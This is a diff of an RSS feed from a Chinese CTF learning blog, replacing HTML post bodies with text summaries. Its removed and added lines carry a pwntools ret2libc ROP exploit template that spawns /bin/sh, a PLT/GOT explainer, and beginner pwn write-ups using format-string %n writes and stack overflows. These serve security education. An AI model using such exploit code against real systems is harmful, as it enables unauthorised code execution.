-log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;write_addr =&amp;gt; &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%#x&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, write_addr)
- 
-libc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; LibcSearcher(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;write&amp;#39;&lt;/span&gt;, write_addr)
-libc_base &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; write_addr &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dump(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;write&amp;#39;&lt;/span&gt;)
-system_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; libc_base &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dump(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;system&amp;#39;&lt;/span&gt;)
-binsh_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; libc_base &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dump(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;str_bin_sh&amp;#39;&lt;/span&gt;)
-log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;system_addr =&amp;gt; &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%#x&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, system_addr)
-log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;binsh_addr =&amp;gt; &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%#x&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, binsh_addr)
-&lt;span style=&#34;color:#75715e&#34;&gt;#*********************&lt;/span&gt;
-&lt;span style=&#34;color:#75715e&#34;&gt;#*********************调用system（“/bin/sh”）&lt;/span&gt;
-select &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
-&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; select &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:
-	&lt;span style=&#34;color:#75715e&#34;&gt;#方案1&lt;/span&gt;
-	payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p32(system_addr) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p32(main_addr) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p32(binsh_addr)
-&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
-	&lt;span style=&#34;color:#75715e&#34;&gt;#方案2&lt;/span&gt;
-	read_plt &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; elf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;plt[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;read&amp;#39;&lt;/span&gt;]
-	pop3_ret &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0804856c&lt;/span&gt;
-	bss_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; elf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;bss()
-	payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p32(read_plt) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p32(pop3_ret) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p32(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p32(bss_addr) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p32(&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;)
-	payload &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p32(system_addr) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p32(main_addr) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p32(bss_addr)
-	payload &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/bin/sh&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;
- 
-send_payload(payload)
- 
-&lt;span style=&#34;color:#75715e&#34;&gt;#****************************&lt;/span&gt;
-p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
+      <description>32位栈溢出rop模板（无PIE） #!usr/bin/env python #coding=utf-8 from pwn import * from LibcSearcher import * context.log_level = &amp;#39;debug&amp;#39; process_name = &amp;#39;./&amp;#39; #p = process([process_name], env={&amp;#39;LD_LIBRARY_PATH&amp;#39;:&amp;#39;./&amp;#39;}) p = remote(&amp;#39;&amp;#39;, ) elf = ELF(process_name) #**************泄露got并寻找libc def send_payload(payload): payload = &amp;#39;A&amp;#39;*(偏移) + payload p.sendlineafter(&amp;#39;&amp;#39;, payload) main_addr = write_plt = elf.plt[&amp;#39;write&amp;#39;] write_got = elf.got[&amp;#34;write&amp;#34;] payload = p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4) send_payload(payload) write_addr = u32(p.recvn(4)) log.info(&amp;#34;write_addr =&amp;gt; %#x&amp;#34;, write_addr) libc = LibcSearcher(&amp;#39;write&amp;#39;, write_addr) libc_base = write_addr - libc.</description>
     </item>
     
     <item>
@@ -182,34 +223,14 @@ p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
       <pubDate>Sun, 11 Jul 2021 15:07:02 +0800</pubDate>
       
       <guid>https://shaodongshi.github.io/posts/plt%E4%B8%8Egot/</guid>
-      <description>&lt;h1 id=&#34;plt与got理解&#34;&gt;plt与got理解&lt;/h1&gt;
-&lt;h2 id=&#34;0x1-基础知识&#34;&gt;0x1 基础知识&lt;/h2&gt;
-&lt;h3 id=&#34;got&#34;&gt;.got&lt;/h3&gt;
-&lt;p&gt;GOT(Global Offset Table)全局偏移表。这是「链接器」为「外部符号」填充的实际偏移表。&lt;/p&gt;
-&lt;h3 id=&#34;plt&#34;&gt;.plt&lt;/h3&gt;
-&lt;p&gt;PLT（Procedure Linkage Table）程序链接表。它有两个功能，要么在 &lt;code&gt;.got.plt&lt;/code&gt; 节中拿到地址，并跳转。要么当 &lt;code&gt;.got.plt&lt;/code&gt; 没有所需地址的时，触发「链接器」去找到所需地址。&lt;/p&gt;
-&lt;h3 id=&#34;gotplt&#34;&gt;.got.plt&lt;/h3&gt;
-&lt;p&gt;这个是 GOT 专门为 PLT 专门准备的节。说白了，&lt;strong&gt;.got.plt 中的值是 GOT 的一部分&lt;/strong&gt;。它包含上述 PLT 表所需地址（已经找到的和需要去触发的）。&lt;/p&gt;
-&lt;h3 id=&#34;pltgot&#34;&gt;.plt.got&lt;/h3&gt;
-&lt;p&gt;貌似没啥用。&lt;/p&gt;
-&lt;h2 id=&#34;0x2--理解&#34;&gt;0x2  理解&lt;/h2&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c#&#34; data-lang=&#34;c#&#34;&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;#&lt;/span&gt;include &amp;lt;stdio.h&amp;gt;
-&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;#&lt;/span&gt;include &amp;lt;stdlib.h&amp;gt;
-
-&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; main(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; argc, &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; **argv)
-{
-    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Hello world!&amp;#34;&lt;/span&gt;);
-    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Hello CTF!&amp;#34;&lt;/span&gt;)
-    exit(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
-}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;当调用第一次puts时，流程如下&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images1/one.png&#34; alt=&#34;one&#34;&gt;&lt;/p&gt;
-&lt;p&gt;第二次调用puts时，流程如下&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images1/two.png&#34; alt=&#34;two&#34;&gt;&lt;/p&gt;
-&lt;h2 id=&#34;0x3-总结&#34;&gt;0x3 总结&lt;/h2&gt;
-&lt;p&gt;.plt 的作用简而言之就是先去 .got.plt 里面找地址，如果找的到，就去执行函数，如果是下一条指令的地址，说明没有，就会去触发链接器找到地址。&lt;/p&gt;
-&lt;p&gt;.got.plt 显而易见用来存储地址，.got.plt 确实是 GOT 的一部分。&lt;/p&gt;
-</description>
+      <description>plt与got理解 0x1 基础知识 .got GOT(Global Offset Table)全局偏移表。这是「链接器」为「外部符号」填充的实际偏移表。
+.plt PLT（Procedure Linkage Table）程序链接表。它有两个功能，要么在 .got.plt 节中拿到地址，并跳转。要么当 .got.plt 没有所需地址的时，触发「链接器」去找到所需地址。
+.got.plt 这个是 GOT 专门为 PLT 专门准备的节。说白了，.got.plt 中的值是 GOT 的一部分。它包含上述 PLT 表所需地址（已经找到的和需要去触发的）。
+.plt.got 貌似没啥用。
+0x2 理解 #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;stdlib.h&amp;gt; int main(int argc, char **argv) { puts(&amp;#34;Hello world!&amp;#34;); puts(&amp;#34;Hello CTF!&amp;#34;) exit(0); } 当调用第一次puts时，流程如下
+第二次调用puts时，流程如下
+0x3 总结 .plt 的作用简而言之就是先去 .got.plt 里面找地址，如果找的到，就去执行函数，如果是下一条指令的地址，说明没有，就会去触发链接器找到地址。
+.got.plt 显而易见用来存储地址，.got.plt 确实是 GOT 的一部分。</description>
     </item>
     
     <item>
@@ -218,209 +239,47 @@ p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
       <pubDate>Wed, 07 Jul 2021 18:14:33 +0800</pubDate>
       
       <guid>https://shaodongshi.github.io/posts/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cwp/</guid>
-      <description>&lt;h1 id=&#34;攻防世界wp&#34;&gt;攻防世界WP&lt;/h1&gt;
-&lt;h2 id=&#34;新手区&#34;&gt;新手区&lt;/h2&gt;
-&lt;h3 id=&#34;题目-get--shell&#34;&gt;题目 get  shell&lt;/h3&gt;
-&lt;h4 id=&#34;题目描述&#34;&gt;题目描述：&lt;/h4&gt;
-&lt;p&gt;运行就能拿到shell呢，真的&lt;/p&gt;
-&lt;h4 id=&#34;题目分析&#34;&gt;题目分析：&lt;/h4&gt;
-&lt;p&gt;nc链接，运行，拿到shell&lt;/p&gt;
-&lt;h4 id=&#34;解题&#34;&gt;解题：&lt;/h4&gt;
-&lt;p&gt;1.nc链接IP（端口是空格）&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images/image-20201230121218856.png&#34; alt=&#34;image-20201230121218856&#34;&gt;&lt;/p&gt;
-&lt;p&gt;2.ls查看文件，cat flag  获得flag&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images/image-20201230121305114.png&#34; alt=&#34;image-20201230121305114&#34;&gt;&lt;/p&gt;
-&lt;h3 id=&#34;题目-cgfsb&#34;&gt;题目 CGfsb&lt;/h3&gt;
-&lt;h4 id=&#34;题目描述-1&#34;&gt;题目描述：&lt;/h4&gt;
-&lt;p&gt;菜鸡面对着pringf发愁，他不知道prinf除了输出还有什么作用&lt;/p&gt;
-&lt;h4 id=&#34;题目分析-1&#34;&gt;题目分析：&lt;/h4&gt;
-&lt;p&gt;1.从题目描述来看，解题的关键是prinf&lt;/p&gt;
-&lt;p&gt;2.查看文件格式，保护设置，运行一下&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images/image-20201230150149289.png&#34; alt=&#34;image-20201230150149289&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images/image-20201230150235986.png&#34; alt=&#34;image-20201230150235986&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images/image-20201230150336918.png&#34; alt=&#34;image-20201230150336918&#34;&gt;&lt;/p&gt;
-&lt;p&gt;发现是一个32位的文件，开启了NX、Stack保护&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images/image-20201230150606994.png&#34; alt=&#34;image-20201230150606994&#34;&gt;&lt;/p&gt;
-&lt;p&gt;这是程序的流程&lt;/p&gt;
-&lt;p&gt;3.结合分析，应该和格式化字符串漏洞有关，放到IDA中具体看一下&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images/image-20201230151140410.png&#34; alt=&#34;image-20201230151140410&#34;&gt;&lt;/p&gt;
-&lt;p&gt;这是一个高危漏洞！！！具体用法先放着，往下看。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images/image-20201230150911401.png&#34; alt=&#34;image-20201230150911401&#34;&gt;&lt;/p&gt;
-&lt;p&gt;看到这边有一个system函数，里面的内容是“cat flag”，这就是答案！！！&lt;/p&gt;
-&lt;p&gt;而想要运行这行代码需要一个条件 pwnme==8，这时候想到前面有一个漏洞。&lt;/p&gt;
-&lt;p&gt;4.格式化字符串漏洞的简单运用&lt;/p&gt;
-&lt;p&gt;%n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置，如%100×10$n表		示将0x64写入偏移10处保存的指针所指向的地址&lt;/p&gt;
-&lt;h4 id=&#34;解题-1&#34;&gt;解题：&lt;/h4&gt;
-&lt;p&gt;1.已经知道了存在格式化字符串漏洞，开始利用，查看偏移量&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images/image-20201230152812609.png&#34; alt=&#34;image-20201230152812609&#34;&gt;&lt;/p&gt;
-&lt;p&gt;输入aaaa，发现0x61616161（aaaa）偏移量为10&lt;/p&gt;
-&lt;p&gt;2.编写脚本&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images/image-20201230153908170.png&#34; alt=&#34;image-20201230153908170&#34;&gt;&lt;/p&gt;
-&lt;p&gt;payload解释：将pwnme的地址转换为一个4字节的数，因为前面输出8个字符，通过%10$n，可以将8写入第10个偏移量对应的地址（pwenme的地址）里&lt;/p&gt;
-&lt;p&gt;3.运行&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images/image-20201230154418227.png&#34; alt=&#34;image-20201230154418227&#34;&gt;&lt;/p&gt;
-&lt;p&gt;拿到falg&lt;/p&gt;
-&lt;p&gt;4.注：&lt;/p&gt;
-&lt;p&gt;还可以这样写payload=‘aaaa’+p32（0x0804A068）+&#39;%11$n&#39;&lt;/p&gt;
-&lt;h3 id=&#34;题目-when_did_you_born&#34;&gt;题目 when_did_you_born&lt;/h3&gt;
-&lt;h4 id=&#34;题目描述-2&#34;&gt;题目描述：&lt;/h4&gt;
-&lt;p&gt;只要知道你的年龄就能获得flag，但菜鸡发现无论如何输入都不正确，怎么办&lt;/p&gt;
-&lt;h4 id=&#34;题目分析-2&#34;&gt;题目分析：&lt;/h4&gt;
-&lt;p&gt;1.从描述来看，关键在于“年龄”&lt;/p&gt;
-&lt;p&gt;2.查看文件格式，保护设置，运行一下&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images/image-20210106192203024.png&#34; alt=&#34;image-20210106192203024&#34;&gt;&lt;/p&gt;
-&lt;p&gt;64位，开启了stack、NX保护。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images/image-20210106192325605.png&#34; alt=&#34;image-20210106192325605&#34;&gt;&lt;/p&gt;
-&lt;p&gt;这是程序基本流程。&lt;/p&gt;
-&lt;p&gt;3.扔到IDA中看一下&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images/image-20210106192634693.png&#34; alt=&#34;image-20210106192634693&#34;&gt;&lt;/p&gt;
-&lt;p&gt;答案就在这！！！&lt;/p&gt;
-&lt;p&gt;整体看一下&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images/image-20210106192907254.png&#34; alt=&#34;image-20210106192907254&#34;&gt;&lt;/p&gt;
-&lt;p&gt;所以思路很明显了，想办法去执行system就可以了。但问题是两个if不能一起执行。此时注意到前面有一个&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images/image-20210106193436330.png&#34; alt=&#34;image-20210106193436330&#34;&gt;&lt;/p&gt;
-&lt;p&gt;漏洞……&lt;/p&gt;
-&lt;p&gt;查看一下&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images/image-20210106195023052.png&#34; alt=&#34;image-20210106195023052&#34;&gt;&lt;/p&gt;
-&lt;p&gt;v4下面正好是v5，那就可以直接覆盖了&lt;/p&gt;
-&lt;h4 id=&#34;解题-2&#34;&gt;解题：&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images/image-20210106195107572.png&#34; alt=&#34;image-20210106195107572&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images/image-20210106195145601.png&#34; alt=&#34;image-20210106195145601&#34;&gt;&lt;/p&gt;
-&lt;p&gt;解决。&lt;/p&gt;
-&lt;h3 id=&#34;题目-hello_pwn&#34;&gt;题目 hello_pwn&lt;/h3&gt;
-&lt;h4 id=&#34;题目描述-3&#34;&gt;题目描述：&lt;/h4&gt;
-&lt;p&gt;pwn！，segment fault! 菜鸡陷入了深思&lt;/p&gt;
-&lt;h4 id=&#34;题目分析-3&#34;&gt;题目分析：&lt;/h4&gt;
-&lt;p&gt;1.题目描述貌似没啥用，不管了&lt;/p&gt;
-&lt;p&gt;2.查看文件，保护，运行一下&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images/image-20210107164704510.png&#34; alt=&#34;image-20210107164704510&#34;&gt;&lt;/p&gt;
-&lt;p&gt;64位，开启了NX保护&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images/image-20210107164749946.png&#34; alt=&#34;image-20210107164749946&#34;&gt;&lt;/p&gt;
-&lt;p&gt;就一句话……&lt;/p&gt;
-&lt;p&gt;3.扔到IDA中看一下&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images/image-20210107165025779.png&#34; alt=&#34;image-20210107165025779&#34;&gt;&lt;/p&gt;
-&lt;p&gt;可以看到只要运行这个函数就可以拿到flag&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images/image-20210107165102382.png&#34; alt=&#34;image-20210107165102382&#34;&gt;&lt;/p&gt;
-&lt;p&gt;这是条件。&lt;/p&gt;
-&lt;p&gt;这时候发现一个漏洞&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images/image-20210107165136562.png&#34; alt=&#34;image-20210107165136562&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images/image-20210107165150398.png&#34; alt=&#34;image-20210107165150398&#34;&gt;&lt;/p&gt;
-&lt;p&gt;好了，可以直接利用溢出完成题目了&lt;/p&gt;
-&lt;h4 id=&#34;解题-3&#34;&gt;解题：&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images/image-20210107165552530.png&#34; alt=&#34;image-20210107165552530&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images/image-20210107165618691.png&#34; alt=&#34;image-20210107165618691&#34;&gt;&lt;/p&gt;
-&lt;p&gt;完成。&lt;/p&gt;
-&lt;h3 id=&#34;题目-level0&#34;&gt;题目 level0&lt;/h3&gt;
-&lt;h4 id=&#34;题目描述-4&#34;&gt;题目描述：&lt;/h4&gt;
-&lt;p&gt;菜鸡了解了什么是溢出，他相信自己能得到shell&lt;/p&gt;
-&lt;h4 id=&#34;题目分析-4&#34;&gt;题目分析：&lt;/h4&gt;
-&lt;p&gt;1.从分析来看，解题关键是拿到shell&lt;/p&gt;
-&lt;p&gt;2.查看文件，保护，运行&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images/image-20210107212219583.png&#34; alt=&#34;image-20210107212219583&#34;&gt;&lt;/p&gt;
-&lt;p&gt;64位，NX保护。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images/image-20210107212327276.png&#34; alt=&#34;image-20210107212327276&#34;&gt;&lt;/p&gt;
-&lt;p&gt;嗯，就一句话，没啥用。&lt;/p&gt;
-&lt;p&gt;3.扔进IDA里面看一下&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images/image-20210107212507099.png&#34; alt=&#34;image-20210107212507099&#34;&gt;&lt;/p&gt;
-&lt;p&gt;发现这个函数，那么只要让它执行这个函数，就可以拿到shell了。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images/image-20210107212619490.png&#34; alt=&#34;image-20210107212619490&#34;&gt;&lt;/p&gt;
-&lt;p&gt;发现这边有一个溢出。开始编写脚本。&lt;/p&gt;
-&lt;h4 id=&#34;解题-4&#34;&gt;解题：&lt;/h4&gt;
-&lt;p&gt;编写脚本&lt;/p&gt;
-&lt;h4 id=&#34;image-20210107213418120imagesimage-20210107213418120png&#34;&gt;&lt;img src=&#34;https://shaodongshi.github.io/images/image-20210107213418120.png&#34; alt=&#34;image-20210107213418120&#34;&gt;&lt;/h4&gt;
-&lt;p&gt;利用一个溢出将callsystem函数的地址编写进去&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images/image-20210107213611957.png&#34; alt=&#34;image-20210107213611957&#34;&gt;&lt;/p&gt;
-&lt;p&gt;完成。&lt;/p&gt;
-&lt;h3 id=&#34;题目-level2&#34;&gt;题目 level2&lt;/h3&gt;
-&lt;h4 id=&#34;题目描述-5&#34;&gt;题目描述：&lt;/h4&gt;
-&lt;p&gt;菜鸡请教大神如何获得flag，大神告诉他‘使用’面向返回的编程（ROP）就可以了&lt;/p&gt;
-&lt;h4 id=&#34;题目分析-5&#34;&gt;题目分析：&lt;/h4&gt;
-&lt;p&gt;1.从题目描述可知，要用到ROP技术。&lt;/p&gt;
-&lt;p&gt;2.查看文件格式，保护，运行。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images/image-20210107215132075.png&#34; alt=&#34;image-20210107215132075&#34;&gt;&lt;/p&gt;
-&lt;p&gt;32位，NX保护&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images/image-20210107215211149.png&#34; alt=&#34;image-20210107215211149&#34;&gt;&lt;/p&gt;
-&lt;p&gt;程序流程。&lt;/p&gt;
-&lt;p&gt;3.扔进IDA里看一下。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images/image-20210107215433049.png&#34; alt=&#34;image-20210107215433049&#34;&gt;&lt;/p&gt;
-&lt;p&gt;存在system函数，可以将‘/bin/sh’，写入，获得shell&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images/image-20210107215534512.png&#34; alt=&#34;image-20210107215534512&#34;&gt;&lt;/p&gt;
-&lt;p&gt;存在溢出漏洞。可以开始编写脚本了&lt;/p&gt;
-&lt;h4 id=&#34;解题-5&#34;&gt;解题：&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images/image-20210107223902494.png&#34; alt=&#34;image-20210107223902494&#34;&gt;&lt;/p&gt;
-&lt;p&gt;构建system（/bin/sh），获得shell&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images/image-20210107223948673.png&#34; alt=&#34;image-20210107223948673&#34;&gt;&lt;/p&gt;
-&lt;p&gt;完成。&lt;/p&gt;
-&lt;h3 id=&#34;题目-string&#34;&gt;题目 string&lt;/h3&gt;
-&lt;h4 id=&#34;题目描述-6&#34;&gt;题目描述：&lt;/h4&gt;
-&lt;p&gt;菜鸡遇到了Dragon,有一位巫师可以帮助他逃离危险，但似乎需要一些要求&lt;/p&gt;
-&lt;h4 id=&#34;题目分析-6&#34;&gt;题目分析：&lt;/h4&gt;
-&lt;p&gt;1.从题目描述来看，解题的关键在“巫师”&lt;/p&gt;
-&lt;p&gt;2.查看文件格式，保护。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images/image-20210108094737987.png&#34; alt=&#34;image-20210108094737987&#34;&gt;&lt;/p&gt;
-&lt;p&gt;64位，保护除了PIE都开了。&lt;/p&gt;
-&lt;p&gt;3.扔到IDA里面看一下。（400CA6）&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images/image-20210108095248994.png&#34; alt=&#34;image-20210108095248994&#34;&gt;&lt;/p&gt;
-&lt;p&gt;ok，找到巫师了，不过，需要条件*a1==a1[1]。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images/image-20210108095535279.png&#34; alt=&#34;image-20210108095535279&#34;&gt;&lt;/p&gt;
-&lt;p&gt;观察一下，可以发现*a1==a1[1],即要满足 *v3==v3[1]。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images/image-20210108095741998.png&#34; alt=&#34;image-20210108095741998&#34;&gt;&lt;/p&gt;
-&lt;p&gt;这时候发现这边存在一个输出漏洞。（printf(&amp;amp;……，&amp;amp;……)）&lt;/p&gt;
-&lt;p&gt;想到使用%n来修改值。&lt;/p&gt;
-&lt;p&gt;查看一下偏移量。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images/image-20210108100559729.png&#34; alt=&#34;image-20210108100559729&#34;&gt;&lt;/p&gt;
-&lt;p&gt;偏移量是7。&lt;/p&gt;
-&lt;p&gt;再来找一下地址。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images/image-20210109191620499.png&#34; alt=&#34;image-20210109191620499&#34;&gt;&lt;/p&gt;
-&lt;p&gt;这边泄露了v4地址，即v3&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images/image-20210108104853416.png&#34; alt=&#34;image-20210108104853416&#34;&gt;&lt;/p&gt;
-&lt;p&gt;并且出现了可以将v1变成一个函数来执行外部命令的语句。&lt;/p&gt;
-&lt;h4 id=&#34;解题-6&#34;&gt;解题：&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images/image-20210109191719627.png&#34; alt=&#34;image-20210109191719627&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images/image-20210109191845878.png&#34; alt=&#34;image-20210109191845878&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images/image-20210109191915466.png&#34; alt=&#34;image-20210109191915466&#34;&gt;&lt;/p&gt;
-&lt;p&gt;完成。&lt;/p&gt;
-&lt;h3 id=&#34;题目-int_overflow&#34;&gt;题目 int_overflow&lt;/h3&gt;
-&lt;h4 id=&#34;题目描述-7&#34;&gt;题目描述：&lt;/h4&gt;
-&lt;p&gt;菜鸡感觉这题似乎没有办法溢出，真的么？&lt;/p&gt;
-&lt;h4 id=&#34;题目分析-7&#34;&gt;题目分析：&lt;/h4&gt;
-&lt;p&gt;1.从题目来看，这题解题关键在于“int_overflow”&lt;/p&gt;
-&lt;p&gt;2.查看文件，保护，运行&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images/image-20210111200827431.png&#34; alt=&#34;image-20210111200827431&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images/image-20210111201002073.png&#34; alt=&#34;image-20210111201002073&#34;&gt;&lt;/p&gt;
